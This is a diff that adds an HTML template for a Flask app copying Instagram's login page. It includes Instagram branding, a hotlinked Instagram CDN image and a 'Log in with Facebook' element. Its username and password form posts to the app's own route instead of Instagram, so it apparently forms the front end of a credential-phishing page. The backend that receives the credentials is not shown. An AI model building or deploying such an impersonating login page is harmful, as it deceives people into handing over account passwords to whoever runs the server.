@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+
+<body>
+    <div class="container">
+        <div class="box">
+            <div class="heading">Instagram</div>
+            <form method="POST" action="/" class="login-form">
+                <div class="field">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="field">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-button">Log in</button>
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="facebook">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VxZDz2BDgjh.png" alt="">
+                    <span>Log in with Facebook</span>
+                </div>
+                <a href="#" class="forgot">Forgot password?</a>
+            </form>
+        </div>
+        <div class="box signup">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+
+</html>
